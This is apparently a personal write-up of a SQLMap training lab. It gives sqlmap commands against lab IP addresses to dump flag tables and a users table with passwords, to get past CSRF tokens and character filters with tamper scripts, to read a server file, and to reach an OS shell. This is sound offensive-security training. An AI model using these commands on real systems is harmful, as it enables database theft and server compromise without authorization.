# SQLMAP Essentials

## Building Attacks

### Running SQLMap in an HTTP Request

What's the contents of table flag2? (Case #2)

What's the contents of table flag3? (Case #3)

What's the contents of table flag4? (Case #4)

### Attack Tuning

What's the contents of table flag5? (Case #5)

`sqlmap -u "http://94.237.62.195:42450/case5.php?id=1" --level 5 --risk 3 --batch --tables --dump`

<figure><img src=".gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

What's the contents of table flag6? (Case #6)

``sqlmap -u "http://94.237.62.195:42450/case6.php?col=id" --prefix '`)' --batch --dump -D testdb -T flag6``

<figure><img src=".gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

What's the contents of table flag7? (Case #7)

* UNION snenanigans

`sqlmap -u "http://94.237.62.195:42450/case7.php?id=1" -v --level 5 --risk 3 --dump`

## Database Enumeration

### DB Enum

`sqlmap -u "http://83.136.250.104:37078/case1.php?id=1" --dump -T flag1 -D testdb`

<figure><img src=".gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

### Advanced DB Enum

**What's the name of the column containing "style" in it's name? (Case #1)**

`sqlmap -u "http://83.136.250.104:41060/case1.php?id=1" --search -C style`

<figure><img src=".gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

**What's the Kimberly user's password? (Case #1)**

`sqlmap -u "http://83.136.250.104:41060/case1.php?id=1" --search -C pass`

<figure><img src=".gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

`sqlmap -u "http://83.136.250.104:41060/case1.php?id=1" --dump -D testdb -T users`

<figure><img src=".gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

## Advanced SQLMap Usage

### Bypassing Web Application Protections

**What's the contents of table flag8? (Case #8)**

<figure><img src=".gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (266).png" alt=""><figcaption><p>obtaining CSRF token called "t0ken"</p></figcaption></figure>

`sqlmap -u "http://83.136.253.251:30281/case8.php" --data="id=1&t0ken=i1wNIQj9yhLrLc36S0yoc0ZV5mybfRaN08Uy7loZj8" --level 5 --risk 3 --csrf-token="t0ken" -v -T flag8 --dump`

<figure><img src=".gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag9? (Case #9)**

<figure><img src=".gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (269).png" alt=""><figcaption><p>obtaining UID</p></figcaption></figure>

`sqlmap -u "http://83.136.253.251:30281/case9.php?id=1&uid=1545767805" --randomize=uid --batch -v 5 -T flag9 --dump`

<figure><img src=".gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag10? (Case #10)**

<figure><img src=".gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag11? (Case #11)**

<figure><img src=".gitbook/assets/image (272).png" alt=""><figcaption><p>Tamper-scripts to bypassing chars by replacing them...</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

### OS Exploitation

<figure><img src=".gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

**Try to use SQLMap to read the file "/var/www/html/flag.txt".**

`sqlmap -u "http://83.136.251.235:51941/?id=1" --file-read "var/www/html/flag.txt"`

<figure><img src=".gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

**Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.**

<figure><img src=".gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

## Skills Assessment

**What's the contents of table final\_flag?**

Okay so, burpsuite, playing around with the shopping items and adding to cart registered the post request. Do the old save to a text file.

Add the old ‘-p id’ which we got from the POST request and our ‘common’ between tamper script we do some quick ‘-D’ database enumeration to tell us it’s in the production database and our database management system is MySql and it’s technique T (Time-Based boolean) we get the above flag.

`sqlmap -u "http://94.237.63.93:46078" -p 'id' --tamper=between -T final_flag -D production --dump --dbms=MySql --technique=T`

<figure><img src=".gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>
